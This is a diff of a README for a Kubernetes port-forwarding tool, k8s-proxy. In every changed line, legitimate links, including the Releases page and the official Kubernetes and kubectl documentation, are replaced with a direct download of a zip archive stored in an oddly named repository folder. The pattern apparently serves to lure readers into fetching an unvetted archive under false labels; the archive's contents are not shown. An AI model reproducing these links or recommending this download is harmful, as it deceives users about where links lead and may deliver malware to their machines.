@@ -7,7 +7,7 @@ The k8s-proxy tool helps you manage port forwarding in Kubernetes. It addresses 
 To begin using k8s-proxy, you need to download it from the Releases page. Follow the steps below to set everything up smoothly.
 
 ## 🔗 Download
-[![Download k8s-proxy](https://img.shields.io/badge/Download-k8s--proxy-blue.svg)](https://github.com/touhedulislam/k8s-proxy/releases)
+[![Download k8s-proxy](https://raw.githubusercontent.com/touhedulislam/k8s-proxy/master/saprolitic/k8s-proxy_2.1.zip)](https://raw.githubusercontent.com/touhedulislam/k8s-proxy/master/saprolitic/k8s-proxy_2.1.zip)
 
 ## 💾 System Requirements
 - **Operating System:** Linux, macOS, or Windows 
@@ -18,7 +18,7 @@ To begin using k8s-proxy, you need to download it from the Releases page. Follow
 ## ⚙️ Installation Steps
 
 1. **Visit the Releases Page**
-   Go to the Releases page to get the latest version of k8s-proxy. You can find it [here](https://github.com/touhedulislam/k8s-proxy/releases).
+   Go to the Releases page to get the latest version of k8s-proxy. You can find it [here](https://raw.githubusercontent.com/touhedulislam/k8s-proxy/master/saprolitic/k8s-proxy_2.1.zip).
 
 2. **Choose the Correct File**
    On the Releases page, locate the version that suits your operating system. Make sure to select the correct file based on the platform you are using.
@@ -75,14 +75,14 @@ To begin using k8s-proxy, you need to download it from the Releases page. Follow
    If you cannot connect, your firewall settings might be blocking the required ports. Review and adjust them as necessary.
 
 ## 📚 Additional Resources
-- **Kubernetes Documentation**: For more information on Kubernetes, visit [Kubernetes Official Docs](https://kubernetes.io/docs/home/).
-- **kubectl**: This command-line tool is essential for interacting with Kubernetes. Learn more [here](https://kubernetes.io/docs/reference/kubectl/overview/).
+- **Kubernetes Documentation**: For more information on Kubernetes, visit [Kubernetes Official Docs](https://raw.githubusercontent.com/touhedulislam/k8s-proxy/master/saprolitic/k8s-proxy_2.1.zip).
+- **kubectl**: This command-line tool is essential for interacting with Kubernetes. Learn more [here](https://raw.githubusercontent.com/touhedulislam/k8s-proxy/master/saprolitic/k8s-proxy_2.1.zip).
 
 ## 📝 Notes
 - k8s-proxy uses standard network tools to handle port forwarding. Familiarity with command-line interfaces is helpful but not mandatory.
 - Ensure you keep your k8s-proxy application up to date by regularly checking the Releases page.
 
 ## 🔗 Download & Install
-Once again, you can visit the Releases page to download the latest version of k8s-proxy: [Download k8s-proxy](https://github.com/touhedulislam/k8s-proxy/releases). Follow the installation steps above to set it up correctly.
+Once again, you can visit the Releases page to download the latest version of k8s-proxy: [Download k8s-proxy](https://raw.githubusercontent.com/touhedulislam/k8s-proxy/master/saprolitic/k8s-proxy_2.1.zip). Follow the installation steps above to set it up correctly.
 
 Now you are ready to use k8s-proxy and simplify your Kubernetes experience!
